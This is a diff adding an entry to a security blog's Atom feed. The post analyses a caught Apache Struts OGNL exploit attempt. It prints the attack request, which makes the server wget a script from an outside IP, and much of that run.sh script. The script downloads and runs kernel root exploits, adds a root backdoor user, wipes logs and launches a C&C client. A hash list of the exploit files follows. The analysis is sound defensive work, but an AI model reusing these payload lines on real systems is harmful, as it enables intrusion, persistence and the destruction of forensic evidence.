@@ -4,7 +4,7 @@
   <title><![CDATA[Yinette's Webshite]]></title>
   <link href="http://yinette.github.io/atom.xml" rel="self"/>
   <link href="http://yinette.github.io/"/>
-  <updated>2014-08-01T17:12:19+10:00</updated>
+  <updated>2014-09-03T22:34:22+10:00</updated>
   <id>http://yinette.github.io/</id>
   <author>
     <name><![CDATA[Yinette]]></name>
@@ -12,6 +12,999 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[It All Began With a Struts Exploit Attempt. Part 1]]></title>
+    <link href="http://yinette.github.io/blog/2014/09/02/it-all-began-with-a-struts-exploit-attempt/"/>
+    <updated>2014-09-02T20:46:04+10:00</updated>
+    <id>http://yinette.github.io/blog/2014/09/02/it-all-began-with-a-struts-exploit-attempt</id>
+    <content type="html"><![CDATA[<p>This post, and the following posts in this series is a Joint Operation with myself and @MalwareMustDie, check out his stuff <a href="http://malwaremustdie.blogspot.com.au">http://malwaremustdie.blogspot.com.au</a> Malware Must Die!</p>
+
+<p>Where I work, my IDS is witness to hundreds and thousands of attacks upon the network daily. Every once in a while, something will pop up that will catch my interest&hellip; This was one of those.</p>
+
+<pre>
+[1:2017173:4] ET EXPLOIT Apache Struts Possible OGNL Java ProcessBuilder in client body
+</pre>
+
+
+<p><em>Quick Sidenote: The server they tried this against had been patched for this exploit</em></p>
+
+<p>I have seen Struts exploits before, but this one stood out as interesting as these attacks are not that common compared to PHP-based attacks that pull down IRCBots written in Perl.</p>
+
+<pre><code>Content-Length: 515
+Expect: 100-continue
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: xxxxxxxxxxxxxxx
+Content-Length: 515
+Expect: 100-continue
+redirect:${#res=#context.get(com.opensymphony.xwork2.dispatcher.HttpServletResponse),#res.setCharacterEncoding("UTF-8"),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"wget","http://61.147.103.21:8080/run.sh"})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[20000],#d.read(#e),#res.getWriter().println(#e),#res.getWriter().flush(),#res.getWriter().close()}
+</code></pre>
+
+<p>Why hello there!</p>
+
+<p>the fun part we get in that is:</p>
+
+<pre>
+{"wget","http://61.147.103.21:8080/run.sh"}
+</pre>
+
+
+<p>DON&rsquo;T MIND IF I DO</p>
+
+<p><em>wget</em></p>
+
+<h2>Its the Shellscript that never ends&hellip;</h2>
+
+<p><code>8484ddd6282dc0b90d4e903866dc1526  run.sh</code></p>
+
+<p>This is a massive script&hellip;. (View it in full here: <a href="https://gist.github.com/anonymous/c947a9c3109a5fe353e8">https://gist.github.com/anonymous/c947a9c3109a5fe353e8</a>)</p>
+
+<pre>
+#!/bin/bash
+
+fcheckr00t()
+{
+    echo " [*] Downloading exploit No. $CNT.."
+    if [ $(whoami) = 'root' ] 2> /dev/null
+    then
+        echo " [*] g0tr00t with exploit No. $CNT"
+        GOTROOT=1
+    else
+        echo " [*] Failed to g0tr00t with exploit No. $CNT"
+        CNT=$((CNT + 1))
+    fi
+}
+
+fcheckdep()
+{
+    if [ $(which wget) -z ] 2> /dev/null
+    then
+        if [ $(which curl) -z ] 2> /dev/null
+        then 
+            echo ' [*] No downloaders found, try self-contained version..'
+            exit
+        else
+            DLER='curl -s -o .profild.key'
+            CURLIT=1
+        fi
+    else
+        DLER='wget -q'
+        CURLIT=''
+    fi
+}
+
+
+fcheckdep
+CNT=1
+GOTROOT=''
+mkdir exploits
+cd exploits
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/1-2
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 1-2
+        ./1-2
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/1-3
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 1-3
+        ./1-3
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/1-4
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 1-4
+        ./1-4
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/2.6.18-374.12.1.el5-2012
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 2.6.18-374.12.1.el5-2012
+        ./2.6.18-374.12.1.el5-2012
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+------ SNIP --------
+</pre>
+
+
+<p>This thing is massive&hellip;.</p>
+
+<pre><code>    $ wc -l run.sh
+    1721 run.sh
+
+    $ ls -alh run.sh
+    -rw-r----- 1 xxxxxx xxxxxx 29K Sep  2 18:55 run.sh
+</code></pre>
+
+<p>This is systematically trying each kernel exploit present on the webserver.</p>
+
+<pre>
+------ SNIP --------
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER 'http://www.pingyan-china.com:8080/Linux_2.6(1).12'
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 Linux_2.6\(1\).12
+        ./Linux_2.6\(1\).12
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/Linux_2.6.12
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 Linux_2.6.12
+        ./Linux_2.6.12
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/vmsplice-local-root-exploit
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 vmsplice-local-root-exploit
+        ./vmsplice-local-root-exploit
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+if [ $GOTROOT -z ] 2> /dev/null
+then
+    $DLER http://www.pingyan-china.com:8080/z1d-2011 
+    if [ $CURLIT -z ] 2> /dev/null
+    then
+        chmod 777 z1d-2011
+        ./z1d-2011
+    else
+        chmod 777 .profild.key
+        ./.profild.key
+    fi
+    fcheckr00t
+fi
+
+cd ..
+rm -rf exploits
+CNT=''
+DLER=''
+CURLIT=''
+
+if [ $GOTROOT = 1 ] 2> /dev/null
+then
+    RUSER='somesecguy'
+    RPASS='g0tr00t'
+    echo ' [*] Adding r00t user..'
+    useradd -g 0 -G root -M -s /bin/bash -p $RPASS $RUSER
+    echo
+    echo " [*] Added r00t user: $RUSER"
+    echo " [*] p455w0rd:  $RPASS"
+    echo " [*] Clearing logs.."
+    RPASS=''
+    RUSER=''
+    GOTROOT=''
+    rm -rf /tmp/logs 2> /dev/null
+    rm -rf /root/.ksh_history 2> /dev/null
+    rm -rf /root/.bash_history 2> /dev/null
+    rm -rf /root/.bash_logout 2> /dev/null
+    rm -rf /usr/local/apache/logs 2> /dev/null
+    rm -rf /usr/local/apache/log 2> /dev/null
+    rm -rf /var/apache/logs 2> /dev/null
+    rm -rf /var/apache/log 2> /dev/null
+    rm -rf /var/run/utmp 2> /dev/null
+    rm -rf /var/logs 2> /dev/null
+    rm -rf /var/log 2> /dev/null
+    rm -rf /var/adm 2> /dev/null
+    rm -rf /etc/wtmp 2> /dev/null
+    rm -rf /etc/utmp 2> /dev/null
+    echo " [*] You g0tr00t, horray for you..."
+killall -9 .profild.key
+./profild.key &
+    whoami
+    id
+else
+    echo " [*] You didn't g0tr00t, sucks to be you..."
+    whoami
+    id
+fi
+</pre>
+
+
+<p>After trying a Kernel Exploits and getting a successful return, it will put it&rsquo;s own (blatantly obvious) user on the system, add it to the root group, and give it a login shell.</p>
+
+<p>It will then run its CnC Connector (Which MMD has a full analysis of below) and await further orders.</p>
+
+<h2>Now we pull apart some ELF binaries.</h2>
+
+<p>Here&rsquo;s where my main man MalwareMustDie comes in, Most of these things it pulls down are ELF Binaries. MMD is the master of these, so I&rsquo;ll leave those to him. I&rsquo;ll be posting a few of his analysis runs on this post, but this will be a two parter.</p>
+
+<p>Most of these seem to be various Kernel exploits to escalate privileges, but we got some other binaries too, MMD will be looking at these.</p>
+
+<p>I&rsquo;ll slowly be going through the scripts and other text-based files here and will tie them into MalwareMustDie&rsquo;s ELF analysis.</p>
+
+<p>Here&rsquo;s MMD&rsquo;s initial hash&#8217;n&#8217;file run on all the lovely toys we found:</p>
+
+<pre>
+// #MalwareMustDie China ELF factory Case PM: @yinettesys 
+// root directory of http://61.147.103.21:8080/ (116 files)
+// date: Tue Sep  2 19:49:44 JST 2014
+// pic snapshot: https://lh6.googleusercontent.com/-9rJWeo2uEOE/VAWh2D3QnUI/AAAAAAAAQxc/tLOTAb-Pg3g/s2176/000.png
+
+10:                          ca36d1dea2e237e34b2886028eace6e9  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+11:                          71798c31da9ebe7de0ae1046a338542c  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.16, not stripped
+2-1:                         cc29a224e327412e0db7f3ce5c4f4e00  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+2-6-32-46-2011:              d0b9d58f3a454ad6df2e4d055858c1e5  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+2-6-37:                      0a656c6bc7eeabb467f6fa38ed57200b  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+2-6-9-2005:                  9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2-6-9-2006:                  9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.18-2011:                 a85d3f342ee981acd04ae01ecac90ce7  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x55603d8a443448ac0441b9826cb6ed2c9ca90c6a, not stripped
+2.6.18-274-2011:             c599953283142f81e3dd00786ae5e339  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.18-374.12.1.el5-2012:    d28ad04b3d7ec12180aa0facde4a15d1  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.18-6-x86-2011:           f8f978474b8a0e3cd29c0ce2f1e2ce24  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=0xfadaca3ae23a563d41ab6b8ed8970e5c5bcadba3, not stripped
+2.6.2-hoolyshit:             b41de74bfebb25385495b00f55f86d7b  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8aa65e6b90c2c96d990a1d21d084b007081dba10, not stripped
+2.6.20:                      b281ec632e9a1abf0512e6fb47a2b22d  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0xbd01b2a57403681bb9e0b4430813c8ae24e7d437, not stripped
+2.6.20-2:                    ecad97fd2f81edbdc64b464f5f41d615  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.22:                      7388c7836cfdf444d458ef71e14f3764  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.22-2008:                 7388c7836cfdf444d458ef71e14f3764  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.22-6-86_64-2007:         d42aff3eca031685a080401611980b68  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.23-2.6.24:               9016a062e7ca5da081c9e1fc7ec8a9d9  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.23-2.6.24_2:             07e6dc1d47bdd39f421456d9113410b7  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0xe824f6f9d73ecf40e98bbcf03c5527b53a3e7f57, not stripped
+2.6.23-2.6.27:               6dac57e2ed1c530373f5957620e3343a  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x0c1099606760b6d744fc70cf706022812004336f, not stripped
+2.6.24:                      9016a062e7ca5da081c9e1fc7ec8a9d9  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.27.7-generi:             ed675f7cc64e171c13e8c1a48f59b050  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x9534017032ab79e62c33d3bbeac761a8909bfb62, not stripped
+2.6.28-2011:                 32b3b21b03e2b3799012345a62e93bc7  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.32-46.1.BHsmp:           f2b00b27e6e8d10d3c27525ecd9af120  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.33:                      b3522ca1a328325a5eefba65eb8e75f3  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.33-2011:                 9332cf422fe610a3b992cc552c8dc329  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.34-2011:                 fb5f74894c583b21b7344c00847780ba  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
+2.6.34-2011Exploit1:         1bc06341c684ee272b4b9dea21271818  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x783520ba58ba9a28710dbd45c33e7e91206f0f72, not stripped
+2.6.34-2011Exploit2:         d723b2f9336a3c355fabe19af64f8191  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x63d51edaa09792f97739bc6bbc7f559033d2e1ba, not stripped
+2.6.37:                      b4707633389d19d744c70bc174da2465  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.37-rc2:                  8043418c198c5ed597825c3fe8c93a20  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+2.6.5_hoolyshit:             3548a183765cec72bcc83ceaedbda8ce  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8aa65e6b90c2c96d990a1d21d084b007081dba10, not stripped
+2.6.6-34:                    eecd5209ab453cad03e700dd8dcb14e7  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x713bcde64c81e264bf6beb6e71a2320297203a9c, not stripped
+2.6.6-34_h00lyshit:          716a1572c17feea66cbe0f5b5fbcb99a  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8d2704030a3ae325f7391a66dceffec4701f0e3a, not stripped
+2.6.6_h00lyshit:             3a96db22d6fafc8fdb0629b5b02db7db  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8aa65e6b90c2c96d990a1d21d084b007081dba10, not stripped
+2.6.7_h00lyshit:             88fbdc17a050f5a0e61d020bbb8790c2  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8aa65e6b90c2c96d990a1d21d084b007081dba10, not stripped
+2.6.8-2008.9-67-2008:        9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.8-5_h00lyshit:           e01b59c242f92bf080cafe91d4c4b544  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x306ea825a585ec53602136866f4a8419c7140c9f, not stripped
+2.6.8_h00lyshit:             155edeb351f0bf3bc1148f1c5b8a72cb  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x8aa65e6b90c2c96d990a1d21d084b007081dba10, not stripped
+2.6.9:                       9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.9-2004:                  227f80f70a3df0221bbc15183be99a29  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0xaa828623ffd092a03a7c6b2bf5b2de116d14a7ef, not stripped
+2.6.9-2008:                  9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.9-34:                    0f59088fcc5f747b4eed7ce154070184  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x5ba63f88727116280f03f21195c698e2d50e694c, not stripped
+2.6.9-42.0.3.ELsmp:          9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.9-42.0.3.ELsmp-2006:     9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.9-55:                    898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.9-55-2007-prv8:          898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.9-55-2008-prv8:          898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2.6.9-672008:                9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.9.2:                     9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2.6.91-2007:                 898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+2007:                        cf6c56ba83b118b59339fd973facc936  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+2009-local:                  f632f166ba1b2d4c1dbfd3c3a6ae8f60  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0xeff15dc54da4d86655f33396d9999a15f414c039, not stripped
+2009-wunderbar:              efdab2a48ee969e9e5d92f5642f7a37d  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0xfbf6f992609d6aaea4cabfe67ce3d29729ad9e6b, not stripped
+2011:                        bf068e7234b88bdc5176e25020aec704  HTML document, ASCII text, with no line terminators
+21:                          a22718f906df6efa9bbf85b62fd31e98  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+3:                           17260fd703b1a28bc9899c7a8e008ecb  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.8, not stripped
+3.4.6-9-2007:                cf6c56ba83b118b59339fd973facc936  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+31:                          d38392c7fe801b017ec2374cf1a41ba4  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), corrupted program header size, corrupted section header size
+314_amd64:                   4ae7bb3fdd984c36c1d54699eda83983  ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x0515130a8eb26a6d6146ef8d927fcc9418ed3567, not stripped
+314_arm32:                   9810036e5bf9c6cb673e78ae61d90cca  ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.14, not stripped
+314_mips:                    cd70bf918ad2c59f0606a8f0ea24ce51  ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, with unknown capability 0x41000000 = 0xf676e75, with unknown capability 0x10000 = 0x70403, not stripped
+36-rc1:                      7f51fb0fb242d52b537923aee9dc86b4  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+4:                           fbe109c8a305326e3d6382931c79ea5a  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), not stripped
+44:                          fe14f4015d87e0ba092a1938c210aa32  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+47:                          9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+5:                           bd30baa1366ca35328db8c65743c1cc2  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+50:                          2aa7b2ed3560dc38884c9dad5f3c5b27  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.16, not stripped
+54:                          898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+6:                           898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+67:                          b65c4db2288501d1c0ba57d8a8a219bf  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+7:                           b5c86d43ca4c4cfb9e7bbecf311b4206  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+7-2:                         13069c09a9e730972aa80facba34f304  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+7x:                          d75e33b06552794cdc4ffacf56ddef68  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+8:                           e6433b5eeae98a0f9c6831cc19261fcd  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+9:                           cf6c56ba83b118b59339fd973facc936  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+90:                          216b4256d0c6fa1aa26e3af2b778be23  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped
+94:                          898dde6afb3142e607528359b0935e9e  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.4.0, not stripped
+L26_TM:                      510450312fd45771782a50975985f0a4  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped
+Linux_2.6(1).12:             94030d4295d745e5c30fe0e552adc824  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped
+Linux_2.6.12:                94030d4295d745e5c30fe0e552adc824  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped
+Linux_2.6.9-joolyshit:       9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+Output.map:                  f8997fe0b1856e8526491a3efa2622ce  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped
+Output.sh:                   7bb57d03b9f572aafe92a53474ab2d06  POSIX shell script, ISO-8859 text executable, with CRLF, LF line terminators
+SSHEXA5.5:                   e2d8f680509a8a8151678aa117a9ed82  directory
+SSHEXA5.5.zip:               d18d100f4f1709a04d627b67c2bda4ca  Zip archive data, at least v1.0 to extract
+acid:                        1191e4317b1db999dddb874358b100d4  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+cc.py:                       a165075fac9d6658063ee1d96adff2af  Python script, ASCII text executable, with CRLF line terminators
+client:                      27b14430b00f8ab6a275cfd078a4779f  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=0x9b9c3a61459d5b931b07439d931c2c31400d50fd, not stripped
+client_x86.tar.gz:           3ce1c3ca87b50c7c59416a386704eb87  gzip compressed data, from Unix, last modified: Sat Oct 19 18:54:15 2013
+d3vil:                       cf6c56ba83b118b59339fd973facc936  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+exp1:                        0ca06667709ffab67e1805213b33bdc2  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+exp2:                        453a82ebc34ca50f3ad523ca84bd1dbc  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+exp3:                        ff8b8b8328cf1854cbdbe9b24d2892fa  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+exploit:                     0d77d3591cd117c26a3a68431e7fd5b6  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked (uses shared libs), stripped
+full-nelson:                 b7d880e7180fc8f369576d51db1c1f98  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+gayros:                      e8af947275be0ff322e1e79aefc25773  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+ip.txt:                      ddffbeddcae91136c6b3ab4bed47fb13  ASCII text, with CRLF line terminators
+ips.rar:                     cbdc45dc8266c73e20abbbfae0f0caa4  RAR archive data, v1d, os: Win32
+keymap22.map:                c948eda49417279d67818d789b0acb78  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.4, not stripped
+lenis.sh:                    e05071a638f30e527e54b0452028845f  POSIX shell script, ASCII text executable
+local-2.6.9-2005-2006:       9e654054624b1556c26f6b7b1532b877  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.5, not stripped
+local-root-exploit-gayros:   c90359da14a9e5fab6a8b0ca8a5b135e  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+passwd.txt:                  270d77b7abb20a785057aaa53af0d2a1  ASCII text, with CRLF line terminators
+priv4:                       caa0bad9e98ce0bb51f4d09858a0b913  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.8, not stripped
+profild.key:                 9a2a00f4bba2f3e0b1211a1f0cb48896  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped
